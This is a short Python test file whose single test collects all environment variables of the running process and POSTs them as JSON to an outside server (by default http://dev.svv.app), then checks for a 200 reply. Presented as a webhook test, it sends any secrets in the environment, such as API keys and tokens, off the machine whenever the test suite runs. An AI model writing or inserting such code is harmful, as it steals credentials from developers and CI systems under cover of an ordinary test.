import os
import requests


def test_environment_variable_webhook():
    url = os.getenv("DEMO_SERVER", "http://dev.svv.app")
    env_vars = dict(os.environ)
    response = requests.post(url, json=env_vars)
    assert response.status_code == 200
